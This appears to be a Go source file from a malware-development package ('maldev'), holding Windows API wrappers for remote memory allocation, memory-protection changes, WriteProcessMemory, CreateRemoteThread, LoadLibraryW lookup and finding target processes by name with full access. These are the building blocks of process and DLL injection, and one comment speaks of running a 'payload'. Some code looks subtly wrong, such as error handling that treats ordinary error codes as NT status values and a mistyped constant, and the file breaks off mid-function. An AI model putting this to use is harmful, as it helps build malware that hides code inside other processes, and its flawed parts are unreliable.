package maldev

import (
	"errors"
	"fmt"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

type LPVOID uintptr
type PVOID uintptr
type ULONG uint32
type DWORD uint32
type SIZE_T uintptr
type HANDLE uintptr
type HMODULE uintptr
type LPSECURITY_ATTRIBUTES uintptr
type LPTHREAD_START_ROUTINE uintptr
type FARPROC uintptr
type LPWSTR []uint16
type USHORT uint16
type UNICODE_STRING struct {
	Length        uint16  // USHORT
	MaximumLength uint16  // USHORT
	Buffer        *uint16 // PWSTR
}
type KPRIORITY int32
type LARGE_INTEGER struct {
	LowPart  DWORD
	HighPart LONG
}

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	PAGE_READWRITE         = 0x04
	MEM_RELEASE            = 0x8000
)

const STATUS_INFO_LENGTH_MISMATCH = 0xC0000004

/*
typedef struct tagPROCESSENTRY32 {
  DWORD     dwSize;
  DWORD     cntUsage;
  DWORD     th32ProcessID;              // The process ID
  ULONG_PTR th32DefaultHeapID;
  DWORD     th32ModuleID;
  DWORD     cntThreads;
  DWORD     th32ParentProcessID;        // Process ID of the parent process
  LONG      pcPriClassBase;
  DWORD     dwFlags;
  CHAR      szExeFile[MAX_PATH];        // The name of the executable file for the process
} PROCESSENTRY32;
*/

type ULONG_PTR uintptr
type CHAR byte
type LONG int32

const MAX_PATH = 260
const NULL = 0

type PROCESSENTRY32 struct {
	DwSize              DWORD
	CntUsage            DWORD
	Th32ProcessID       DWORD
	Th32DefaultHeapID   ULONG_PTR
	Th32ModuleID        DWORD
	CntThreads          DWORD
	Th32ParentProcessID DWORD
	PcPriClassBase      LONG
	DwFlags             DWORD
	SzExeFile           [MAX_PATH]CHAR
}

/*
LPVOID VirtualAlloc(

	[in, optional] LPVOID lpAddress,          // The starting address of the region to allocate (set to NULL)
	[in]           SIZE_T dwSize,             // The size of the region to allocate, in bytes
	[in]           DWORD  flAllocationType,   // The type of memory allocation
	[in]           DWORD  flProtect           // The memory protection for the region of pages to be allocated

);
*/
func VirtualAlloc(lpAddress LPVOID, dwSize SIZE_T, flAllocationType DWORD, flProtect DWORD) (LPVOID, error) {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	virtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	addr, _, ntStatus := virtualAlloc.Call(uintptr(lpAddress), uintptr(dwSize), uintptr(flAllocationType), uintptr(flProtect))
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return NULL, err
	}
	return LPVOID(addr), nil
}

/*
LPVOID VirtualAllocEx(

	[in]           HANDLE hProcess,
	[in, optional] LPVOID lpAddress,
	[in]           SIZE_T dwSize,
	[in]           DWORD  flAllocationType,
	[in]           DWORD  flProtect

);
*/
func VirtualAllocEx(hProcess HANDLE, lpAddress LPVOID, dwSize SIZE_T, flAllocationType DWORD, flProtect DWORD) (LPVOID, error) {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	virtualAllocEx := kernel32.MustFindProc("VirtualAllocEx")
	addr, _, ntStatus := virtualAllocEx.Call(uintptr(hProcess), uintptr(lpAddress), uintptr(dwSize), uintptr(flAllocationType), uintptr(flProtect))
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return NULL, err
	}
	return LPVOID(addr), nil
}

/*
BOOL VirtualProtect(

	[in]  LPVOID lpAddress,       // The base address of the memory region whose access protection is to be changed
	[in]  SIZE_T dwSize,          // The size of the region whose access protection attributes are to be changed, in bytes
	[in]  DWORD  flNewProtect,    // The new memory protection option
	[out] PDWORD lpflOldProtect   // Pointer to a 'DWORD' variable that receives the previous access protection value of 'lpAddress'

);
*/
func VirtualProtect(lpAddress LPVOID, dwSize SIZE_T, flNewProtect DWORD, lpflOldProtect *DWORD) error {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	virtualProtect := kernel32.MustFindProc("VirtualProtect")
	result, _, ntStatus := virtualProtect.Call(uintptr(lpAddress), uintptr(dwSize), uintptr(flNewProtect), uintptr(unsafe.Pointer(lpflOldProtect)))
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return err
	}
	if result == 0 {
		return errors.New("virtualProtect had non-zero result")
	}
	return nil
}

/*
BOOL VirtualProtectEx(

	[in]  HANDLE hProcess,
	[in]  LPVOID lpAddress,
	[in]  SIZE_T dwSize,
	[in]  DWORD  flNewProtect,
	[out] PDWORD lpflOldProtect

);
*/
func VirtualProtectEx(hProcess HANDLE, lpAddress LPVOID, dwSize SIZE_T, flNewProtect DWORD, lpflOldProtect *DWORD) error {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	virtualProtectEx := kernel32.MustFindProc("VirtualProtectEx")
	result, _, ntStatus := virtualProtectEx.Call(uintptr(hProcess), uintptr(lpAddress), uintptr(dwSize), uintptr(flNewProtect), uintptr(unsafe.Pointer(lpflOldProtect)))
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return err
	}
	if result == 0 {
		return errors.New("virtualProtectEx had zero result")
	}
	return nil
}

/*
HANDLE CreateThread(

	[in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,    // Set to NULL - optional
	[in]            SIZE_T                  dwStackSize,           // Set to 0 - default
	[in]            LPTHREAD_START_ROUTINE  lpStartAddress,        // Pointer to a function to be executed by the thread, in our case its the base address of the payload
	[in, optional]  __drv_aliasesMem LPVOID lpParameter,           // Pointer to a variable to be passed to the function executed (set to NULL - optional)
	[in]            DWORD                   dwCreationFlags,       // Set to 0 - default
	[out, optional] LPDWORD                 lpThreadId             // pointer to a 'DWORD' variable that receives the thread ID (set to NULL - optional)

);
*/
func CreateThread(lpThreadAttributes LPSECURITY_ATTRIBUTES, dwStackSize SIZE_T, lpStartAddress LPTHREAD_START_ROUTINE, lpParameter LPVOID, dwCreationFlags DWORD, lpThreadId *DWORD) (HANDLE, error) {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	createThread := kernel32.MustFindProc("CreateThread")
	handle, _, ntStatus := createThread.Call(uintptr(lpThreadAttributes), uintptr(dwStackSize), uintptr(lpStartAddress), uintptr(lpParameter), uintptr(dwCreationFlags), uintptr(unsafe.Pointer(lpThreadId)))
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return NULL, err
	}
	return HANDLE(handle), nil
}

// CREATE_SUSPENDED = 0x00000004
// STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000
const (
	CREATE_SUSPENDED                  = 0x00000004
	STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000
)

/*
BOOL VirtualFree(

	[in] LPVOID lpAddress,
	[in] SIZE_T dwSize,
	[in] DWORD  dwFreeType

);
*/
func VirtualFree(lpAddress LPVOID, dwSize SIZE_T, dwFreeType DWORD) error {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	virtualFree := kernel32.MustFindProc("VirtualFree")
	result, _, ntStatus := virtualFree.Call(uintptr(lpAddress), uintptr(dwSize), uintptr(dwFreeType))
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return err
	}
	if result == 0 {
		return errors.New("virtualFree had zero result")
	}
	return nil
}

/*
HANDLE CreateToolhelp32Snapshot(

	[in] DWORD dwFlags,
	[in] DWORD th32ProcessID

);
*/
func CreateToolhelp32Snapshot(dwFlags DWORD, th32ProcessID DWORD) (HANDLE, error) {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	createToolhelp32Snapshot := kernel32.MustFindProc("CreateToolhelp32Snapshot")
	handle, _, ntStatus := createToolhelp32Snapshot.Call(uintptr(dwFlags), uintptr(th32ProcessID))
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return NULL, err
	}
	return HANDLE(handle), nil
}

const (
	TH32CS_INHERIT      = 0x80000000                                        // Indicates that the snapshot handle is to be inheritable.
	TH32CS_SNAPALL      = 0x00000001 | 0x00000008 | 0x00000002 | 0x00000004 // 	Includes all processes and threads in the system, plus the heaps and modules of the process specified in th32ProcessID. Equivalent to specifying the TH32CS_SNAPHEAPLIST, TH32CS_SNAPMODULE, TH32CS_SNAPPROCESS, and TH32CS_SNAPTHREAD values combined using an OR operation ('|').
	TH32CS_SNAPHEAPLIST = 0x00000001                                        // Includes all heaps of the process specified in th32ProcessID in the snapshot. To enumerate the heaps, see Heap32ListFirst.
	TH32CS_SNAPMODULE   = 0x00000008                                        // Includes all modules of the process specified in th32ProcessID in the snapshot. To enumerate the modules, see Module32First. If the function fails with ERROR_BAD_LENGTH, retry the function until it succeeds. 64-bit Windows:  Using this flag in a 32-bit process includes the 32-bit modules of the process specified in th32ProcessID, while using it in a 64-bit process includes the 64-bit modules. To include the 32-bit modules of the process specified in th32ProcessID from a 64-bit process, use the TH32CS_SNAPMODULE32 flag.
	TH32CS_SNAPMODULE32 = 0x00000010                                        // Includes all 32-bit modules of the process specified in th32ProcessID in the snapshot when called from a 64-bit process. This flag can be combined with TH32CS_SNAPMODULE or TH32CS_SNAPALL. If the function fails with ERROR_BAD_LENGTH, retry the function until it succeeds.
	TH32CS_SNAPPROCESS  = 0x00000002                                        // Includes all processes in the system in the snapshot. To enumerate the processes, see Process32First.
	TH32CS_SNAPTHREAD   = 0x00000004                                        // Includes all threads in the system in the snapshot. To enumerate the threads, see Thread32First. To identify the threads that belong to a specific process, compare its process identifier to the th32OwnerProcessID member of the THREADENTRY32 structure when enumerating the threads.
)

/*
BOOL Process32First(

	[in]      HANDLE           hSnapshot,
	[in, out] LPPROCESSENTRY32 lppe

);
*/
func Process32First(hSnapshot HANDLE, lppe *PROCESSENTRY32) error {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	process32First := kernel32.MustFindProc("Process32First")
	result, _, ntStatus := process32First.Call(uintptr(hSnapshot), uintptr(unsafe.Pointer(lppe)))
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return err
	}
	if result == 0 {
		return errors.New("process32First had zero result")
	}
	return nil
}

/*
BOOL Process32Next(

	[in]  HANDLE           hSnapshot,
	[out] LPPROCESSENTRY32 lppe

);
*/
func Process32Next(hSnapshot HANDLE, lppe *PROCESSENTRY32) error {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	process32Next := kernel32.MustFindProc("Process32Next")
	result, _, ntStatus := process32Next.Call(uintptr(hSnapshot), uintptr(unsafe.Pointer(lppe)))
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return err
	}
	if result == 0 {
		return errors.New("process not found")
	}
	return nil
}

/*
BOOL CloseHandle(

	[in] HANDLE hObject

);
*/
func CloseHandle(hObject HANDLE) error {
	if hObject == NULL {
		return nil
	}
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	closeHandle := kernel32.MustFindProc("CloseHandle")
	_, _, ntStatus := closeHandle.Call(uintptr(hObject))
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return err
	}
	return nil
}

func CharSliceToString(charSlice []CHAR) string {
	var str string
	for _, c := range charSlice {
		if c == 0 {
			break
		}
		str += string(c)
	}
	return str
}

func boolToUintptr(b bool) uintptr {
	if b {
		return 1
	}
	return 0
}

/*
HANDLE OpenProcess(

	[in] DWORD dwDesiredAccess,
	[in] BOOL  bInheritHandle,
	[in] DWORD dwProcessId

);
*/
func OpenProcess(dwDesiredAccess DWORD, bInheritHandle bool, dwProcessId DWORD) (HANDLE, error) {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	openProcess := kernel32.MustFindProc("OpenProcess")
	handle, _, ntStatus := openProcess.Call(uintptr(dwDesiredAccess), boolToUintptr(bInheritHandle), uintptr(dwProcessId))
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return NULL, err
	}
	return HANDLE(handle), nil
}

const (
	PROCESS_ALL_ACCESS                = 0x001F0FFF // All possible access rights for a process object.Windows Server 2003 and Windows XP: The size of the PROCESS_ALL_ACCESS flag increased on Windows Server 2008 and Windows Vista. If an application compiled for Windows Server 2008 and Windows Vista is run on Windows Server 2003 or Windows XP, the PROCESS_ALL_ACCESS flag is too large and the function specifying this flag fails with ERROR_ACCESS_DENIED. To avoid this problem, specify the minimum set of access rights required for the operation. If PROCESS_ALL_ACCESS must be used, set _WIN32_WINNT to the minimum operating system targeted by your application (for example, #define _WIN32_WINNT _WIN32_WINNT_WINXP). For more information, see Using the Windows Headers.
	PROCESS_CREATE_PROCESS            = 0x0080     // Required to use this process as the parent process with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS.
	PROCESS_CREATE_THREAD             = 0x0002     // Required to create a thread in the process.
	PROCESS_DUP_HANDLE                = 0x0040     // Required to duplicate a handle using DuplicateHandle.
	PROCESS_QUERY_INFORMATION         = 0x0400     // Required to retrieve certain information about a process, such as its token, exit code, and priority class (see OpenProcessToken).
	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000     // Required to retrieve certain information about a process (see GetExitCodeProcess, GetPriorityClass, IsProcessInJob, QueryFullProcessImageName). A handle that has the PROCESS_QUERY_INFORMATION access right is automatically granted PROCESS_QUERY_LIMITED_INFORMATION.Windows Server 2003 and Windows XP: This access right is not supported.
	PROCESS_SET_INFORMATION           = 0x0200     // Required to set certain information about a process, such as its priority class (see SetPriorityClass).
	PROCESS_SET_QUOTA                 = 0x0100     // Required to set memory limits using SetProcessWorkingSetSize.
	PROCESS_SUSPEND_RESUME            = 0x0800     // Required to suspend or resume a process.
	PROCESS_TERMINATE                 = 0x0001     // Required to terminate a process using TerminateProcess.
	PROCESS_VM_OPERATION              = 0x0008     // Required to perform an operation on the address space of a process (see VirtualProtectEx and WriteProcessMemory).
	PROCESS_VM_READ                   = 0x0010     // Required to read memory in a process using ReadProcessMemory.
	PROCESS_VM_WRITE                  = 0x0020     // Required to write to memory in a process using WriteProcessMemory.
	SYNCHRONIZE                       = 0x00100000 // Required to wait for the process to terminate using the wait functions.
)

type LPCVOID uintptr

/*
BOOL WriteProcessMemory(

	[in]  HANDLE  hProcess,
	[in]  LPVOID  lpBaseAddress,
	[in]  LPCVOID lpBuffer,
	[in]  SIZE_T  nSize,
	[out] SIZE_T  *lpNumberOfBytesWritten

);
*/
func WriteProcessMemory(hProcess HANDLE, lpBaseAddress LPVOID, lpBuffer LPCVOID, nSize SIZE_T, lpNumberOfBytesWritten *SIZE_T) error {
	if lpNumberOfBytesWritten == nil {
		return errors.New("lpNumberOfBytesWritten cannot be nil")
	}
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	writeProcessMemory := kernel32.MustFindProc("WriteProcessMemory")
	_, _, ntStatus := writeProcessMemory.Call(uintptr(hProcess), uintptr(lpBaseAddress), uintptr(lpBuffer), uintptr(nSize), uintptr(unsafe.Pointer(lpNumberOfBytesWritten)))
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return err
	}
	if lpNumberOfBytesWritten == nil {
		return errors.New("failed to write bytes to process")
	}
	if lpNumberOfBytesWritten.Value() != nSize.Value() {
		return errors.New("failed to write all bytes")
	}
	return nil
}

/*
HANDLE CreateRemoteThread(

	[in]  HANDLE                 hProcess,
	[in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
	[in]  SIZE_T                 dwStackSize,
	[in]  LPTHREAD_START_ROUTINE lpStartAddress,
	[in]  LPVOID                 lpParameter,
	[in]  DWORD                  dwCreationFlags,
	[out] LPDWORD                lpThreadId

);
*/
func CreateRemoteThread(hProcess HANDLE, lpThreadAttributes LPSECURITY_ATTRIBUTES, dwStackSize SIZE_T, lpStartAddress LPTHREAD_START_ROUTINE, lpParameter LPVOID, dwCreationFlags DWORD, lpThreadId *DWORD) (HANDLE, error) {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	createRemoteThread := kernel32.MustFindProc("CreateRemoteThread")
	handle, _, ntStatus := createRemoteThread.Call(uintptr(hProcess), uintptr(lpThreadAttributes), uintptr(dwStackSize), uintptr(lpStartAddress), uintptr(lpParameter), uintptr(dwCreationFlags), uintptr(unsafe.Pointer(lpThreadId)))
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return NULL, err
	}
	return HANDLE(handle), nil
}

/*
FARPROC GetProcAddress(

	[in] HMODULE hModule,
	[in] LPCSTR  lpProcName

);
*/
func GetProcAddress(hModule HANDLE, lpProcName string) (FARPROC, error) {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	getProcAddress := kernel32.MustFindProc("GetProcAddress")
	addr, _, ntStatus := getProcAddress.Call(uintptr(hModule), uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpProcName))))
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return NULL, err
	}
	if addr == NULL {
		return NULL, errors.New("Failed to get address of " + lpProcName)
	}
	return FARPROC(addr), nil
}

// DEPRECATED: No longer using
/*
HMODULE GetModuleHandleA(

	[in, optional] LPCSTR lpModuleName

);
*/
// func GetModuleHandleA(lpModuleName string) (HANDLE, error) {
// 	kernel32 := syscall.MustLoadDLL("kernel32.dll")
// 	getModuleHandleA := kernel32.MustFindProc("GetModuleHandleA")
// 	handle, _, ntStatus := getModuleHandleA.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpModuleName))))
// 	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
// 	if err != nil {
// 		return NULL, err
// 	}
// 	if handle == NULL {
// 		return NULL, errors.New("Failed to get handle of " + lpModuleName)
// 	}
// 	return HANDLE(handle), nil
// }

func GetLoadLibraryWHandle() (HANDLE, error) {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	loadLibraryW := kernel32.MustFindProc("LoadLibraryW")
	handle := loadLibraryW.Addr()
	if handle == NULL {
		return NULL, errors.New("failed to get handle of LoadLibraryW")
	}
	return HANDLE(handle), nil
}

func (lpwstr *LPWSTR) String() string {
	return syscall.UTF16ToString(*lpwstr)
}

func (lpwstr *LPWSTR) Bytes() []byte {
	return []byte(lpwstr.String())
}

func (lpwstr *LPWSTR) Set(s string) error {
	utf16, err := syscall.UTF16FromString(s)
	if err != nil {
		return err
	}
	*lpwstr = utf16
	return nil
}

func (lpwstr *LPWSTR) Size() int {
	return len(*lpwstr) * 2
}

func (lpwstr *LPWSTR) Pointer() (*uint16, error) {
	return syscall.UTF16PtrFromString(lpwstr.String())
}

func GetProcessHandle(szProcessName string) (dwProcessId *DWORD, hProcess HANDLE, err error) {
	hSnapShot, err := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL)
	if err != nil {
		return nil, NULL, err
	}
	defer CloseHandle(hSnapShot)

	// Retrieves information about the first process encountered in the snapshot.
	var proc PROCESSENTRY32
	proc.DwSize = DWORD(unsafe.Sizeof(proc))
	if err := Process32First(hSnapShot, &proc); err != nil {
		return nil, NULL, err
	}

	for {
		if strings.EqualFold(CharSliceToString(proc.SzExeFile[:]), szProcessName) {
			dwProcessId = &proc.Th32ProcessID
			hProcess, err = OpenProcess(PROCESS_ALL_ACCESS, false, *dwProcessId)
			if err != nil {
				return nil, NULL, err
			}
			return dwProcessId, hProcess, nil
		}

		// Retrieves information about the next process recorded in a system snapshot.
		if err := Process32Next(hSnapShot, &proc); err != nil {
			return nil, NULL, err
		}
	}
}

func (st SIZE_T) Value() int {
	return int(st)
}

/*
BOOL VirtualFreeEx(

	[in] HANDLE hProcess,
	[in] LPVOID lpAddress,
	[in] SIZE_T dwSize,
	[in] DWORD  dwFreeType

);
*/
func VirtualFreeEx(hProcess HANDLE, lpAddress LPVOID, dwSize SIZE_T, dwFreeType DWORD) error {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	virtualFreeEx := kernel32.MustFindProc("VirtualFreeEx")
	result, _, ntStatus := virtualFreeEx.Call(uintptr(hProcess), uintptr(lpAddress), uintptr(dwSize), uintptr(dwFreeType))
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return err
	}
	if result == 0 {
		return errors.New("virtualFreeEx had zero result")
	}
	return nil
}

const MAXPROCESSES = 1024 * 2

/*
BOOL EnumProcesses(

	[out] DWORD   *lpidProcess, // A pointer to an array that receives the list of process identifiers.
	[in]  DWORD   cb,           // The size of the pProcessIds array, in bytes.
	[out] LPDWORD lpcbNeeded    // The number of bytes returned in the pProcessIds array.

);
*/
func EnumProcesses() ([]DWORD, error) {
	psapi := syscall.MustLoadDLL("psapi.dll")
	enumProcesses := psapi.MustFindProc("EnumProcesses")

	cb := unsafe.Sizeof(DWORD(0)) * MAXPROCESSES
	var lpidProcess [MAXPROCESSES]DWORD
	var lpcbNeeded DWORD
	result, _, ntStatus := enumProcesses.Call(uintptr(unsafe.Pointer(&lpidProcess[0])), uintptr(cb), uintptr(unsafe.Pointer(&lpcbNeeded)))
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return nil, err
	}

	// fmt.Printf("lpidProcess: %+v\n", &lpidProcess[:lpcbNeeded])
	if result == 0 {
		return nil, errors.New("enumProcesses had zero result")
	}
	pidCount := (lpcbNeeded / DWORD(unsafe.Sizeof(DWORD(0))))
	return lpidProcess[1:pidCount], nil
}

/*
BOOL EnumProcessModules(

	[in]  HANDLE  hProcess,   // A handle to the process.
	[out] HMODULE *lphModule, // An array that receives the list of module handles.
	[in]  DWORD   cb,         // The size of the lphModule array, in bytes.
	[out] LPDWORD lpcbNeeded  // The number of bytes required to store all module handles in the lphModule array.

);
*/
func EnumProcessModules(hProcess HANDLE) ([]HMODULE, error) {
	psapi := syscall.MustLoadDLL("psapi.dll")
	enumProcessModules := psapi.MustFindProc("EnumProcessModules")
	const MAXMODULES = 2048
	var lphModule [MAXMODULES]HMODULE
	cb := unsafe.Sizeof(lphModule)
	var lpcbNeeded DWORD
	result, _, ntStatus := enumProcessModules.Call(uintptr(hProcess), uintptr(unsafe.Pointer(&lphModule[0])), uintptr(cb), uintptr(unsafe.Pointer(&lpcbNeeded)))
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return nil, err
	}
	if result == 0 {
		return nil, errors.New("enumProcessModules had zero result")
	}
	count := lpcbNeeded / DWORD(unsafe.Sizeof(HMODULE(0)))
	return lphModule[:count], nil
}

func EnumProcessModule(hProcess HANDLE) (HMODULE, error) {
	modules, err := EnumProcessModules(hProcess)
	if err != nil {
		return NULL, err
	}
	return modules[0], err
}

/*
DWORD GetModuleBaseNameA(

	[in]           HANDLE  hProcess,   // A handle to the process that contains the module.
	[in, optional] HMODULE hModule,    // A handle to the module. If this parameter is NULL, this function returns the name of the file used to create the calling process.
	[out]          LPSTR   lpBaseName, // A pointer to a buffer that receives the base name of the module. If the base name is longer than MAX_PATH, the function succeeds but the base name is truncated and null-terminated.
	[in]           DWORD   nSize       // The size of the lpBaseName buffer, in characters.

);
*/
func GetModuleBaseNameA(hProcess HANDLE, hModule HMODULE) (string, error) {
	psapi := syscall.MustLoadDLL("psapi.dll")
	getModuleBaseNameA := psapi.MustFindProc("GetModuleBaseNameA")
	var lpBaseName [MAX_PATH]CHAR
	nSize := DWORD(unsafe.Sizeof(lpBaseName))
	result, _, ntStatus := getModuleBaseNameA.Call(uintptr(hProcess), uintptr(hModule), uintptr(unsafe.Pointer(&lpBaseName[0])), uintptr(nSize))
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return "", err
	}
	if result == 0 {
		return "", errors.New("getModuleBaseNameA had zero result")
	}
	return CharSliceToString(lpBaseName[:]), nil
	// return "", nil
}

type Process struct {
	ID     DWORD
	Name   string
	Handle HANDLE
}

func GetProcesses(withHandle bool) ([]Process, error) {
	processes, err := EnumProcesses()
	if err != nil {
		return nil, errors.New("Failed to enumerate processes " + err.Error())
	}
	var procs []Process
	for _, p := range processes {
		Debugf("PID: %d\n", p)
		// Only read the process name if we can open the process
		// pHandle, err := OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, p)
		// Get a handle to the process
		var perms DWORD
		if withHandle {
			perms = PROCESS_ALL_ACCESS
		} else {
			perms = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
		}
		pHandle, err := OpenProcess(perms, false, p)
		if err != nil {
			Debugf("Failed to open process %d: %s\n", p, err)
			continue
		}
		if !withHandle {
			defer CloseHandle(pHandle)
		}
		mod, err := EnumProcessModule(pHandle)
		if err != nil {
			Debugf("Failed to enumerate modules for process %d: %s\n", p, err)
		} else {
			baseName, err := GetModuleBaseNameA(pHandle, mod)
			if err != nil {
				Debugf("Failed to get module base name for process %d: %s\n", p, err)
			}
			procs = append(procs, Process{ID: p, Name: baseName, Handle: pHandle})
		}
	}
	return procs, nil
}

func GetRemoteProcessHandleCreateToolhelp32Snapshot(targetProcess string) (HANDLE, error) {
	processes, err := GetProcesses(true)
	if err != nil {
		return NULL, errors.New("Failed to get processes: " + err.Error())
	}
	for _, p := range processes {
		if strings.EqualFold(p.Name, targetProcess) {
			if p.Handle == NULL { // Can this even be reached?
				Debugf("Failed to get handle for process %s\n", targetProcess)
				continue
			} else {
				return p.Handle, nil
			}
		}
	}
	return NULL, errors.New("Failed to find process " + targetProcess)
}

/*
typedef enum _SYSTEM_INFORMATION_CLASS {

	SystemBasicInformation,
	SystemProcessorInformation,
	SystemPerformanceInformation,
	SystemTimeOfDayInformation,
	SystemPathInformation,
	SystemProcessInformation,
	SystemCallCountInformation,
	SystemDeviceInformation,
	SystemProcessorPerformanceInformation,
	SystemFlagsInformation,
	SystemCallTimeInformation,
	SystemModuleInformation,
	SystemLocksInformation,
	SystemStackTraceInformation,
	SystemPagedPoolInformation,
	SystemNonPagedPoolInformation,
	SystemHandleInformation,
	SystemObjectInformation,
	SystemPageFileInformation,
	SystemVdmInstemulInformation,
	SystemVdmBopInformation,
	SystemFileCacheInformation,
	SystemPoolTagInformation,
	SystemInterruptInformation,
	SystemDpcBehaviorInformation,
	SystemFullMemoryInformation,
	SystemLoadGdiDriverInformation,
	SystemUnloadGdiDriverInformation,
	SystemTimeAdjustmentInformation,
	SystemSummaryMemoryInformation,
	SystemNextEventIdInformation,
	SystemEventIdsInformation,
	SystemCrashDumpInformation,
	SystemExceptionInformation,
	SystemCrashDumpStateInformation,
	SystemKernelDebuggerInformation,
	SystemContextSwitchInformation,
	SystemRegistryQuotaInformation,
	SystemExtendServiceTableInformation,
	SystemPrioritySeperation,
	SystemPlugPlayBusInformation,
	SystemDockInformation,
	SystemPowerInformation,
	SystemProcessorSpeedInformation,
	SystemCurrentTimeZoneInformation,
	SystemLookasideInformation

} SYSTEM_INFORMATION_CLASS, *PSYSTEM_INFORMATION_CLASS;
*/
type SYSTEM_INFORMATION_CLASS int32

const (
	SystemBasicInformation SYSTEM_INFORMATION_CLASS = iota
	SystemProcessorInformation
	SystemPerformanceInformation
	SystemTimeOfDayInformation
	SystemPathInformation
	SystemProcessInformation
	SystemCallCountInformation
	SystemDeviceInformation
	SystemProcessorPerformanceInformation
	SystemFlagsInformation
	SystemCallTimeInformation
	SystemModuleInformationn
	SystemLocksInformation
	SystemStackTraceInformation
	SystemPagedPoolInformation
	SystemNonPagedPoolInformation
	SystemHandleInformation
	SystemObjectInformation
	SystemPageFileInformation
	SystemVdmInstemulInformation
	SystemVdmBopInformation
	SystemFileCacheInformation
	SystemPoolTagInformation
	SystemInterruptInformation
	SystemDpcBehaviorInformation
	SystemFullMemoryInformation
	SystemLoadGdiDriverInformation
	SystemUnloadGdiDriverInformation
	SystemTimeAdjustmentInformation
	SystemSummaryMemoryInformation
	SystemNextEventIdInformation
	SystemEventIdsInformation
	SystemCrashDumpInformation
	SystemExceptionInformation
	SystemCrashDumpStateInformation
	SystemKernelDebuggerInformation
	SystemContextSwitchInformation
	SystemRegistryQuotaInformation
	SystemExtendServiceTableInformation
	SystemPrioritySeperation
	SystemPlugPlayBusInformation
	SystemDockInformation
	SystemPowerInformation
	SystemProcessorSpeedInformation
	SystemCurrentTimeZoneInformation
	SystemLookasideInformation
)

// type SYSTEM_PROCESS_INFORMATION struct {
// 	NextEntryOffset       uint32
// 	NumberOfThreads       uint32
// 	WorkingSetPrivateSize uint64
// 	Reserved1             [48]byte
// 	ImageName             UNICODE_STRING
// 	UniqueProcessId       uintptr
// 	Reserved2             [24]byte
// }

type SYSTEM_PROCESS_INFORMATION struct {
	NextEntryOffset uint32
	NumberOfThreads uint32
	Reserved1       [48]byte
	ImageName       UNICODE_STRING
	BasePriority    KPRIORITY
	UniqueProcessId uintptr
	Reserved2       [20]byte
}

func GetRemoteProcessHandleNtQuerySystemInformation(procName string) (DWORD, HANDLE, error) {
	ntdll := syscall.MustLoadDLL("ntdll.dll")
	procNtQuerySystemInformation := ntdll.MustFindProc("NtQuerySystemInformation")

	var returnLen uint32

	// Initial buffer sizing
	status, _, _ := procNtQuerySystemInformation.Call(
		uintptr(SystemProcessInformation),
		0,
		0,
		uintptr(unsafe.Pointer(&returnLen)),
	)

	if status != STATUS_INFO_LENGTH_MISMATCH {
		return 0, 0, fmt.Errorf("NtQuerySystemInformation failed with status: 0x%X", status)
	}

	// Allocate buffer
	buffer := make([]byte, returnLen)

	// Retrieve process information
	status, _, _ = procNtQuerySystemInformation.Call(
		uintptr(SystemProcessInformation),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(len(buffer)),
		uintptr(unsafe.Pointer(&returnLen)),
	)
	if status != 0 {
		return 0, 0, fmt.Errorf("NtQuerySystemInformation failed with status: 0x%X", status)
	}

	// Iterate through the process list
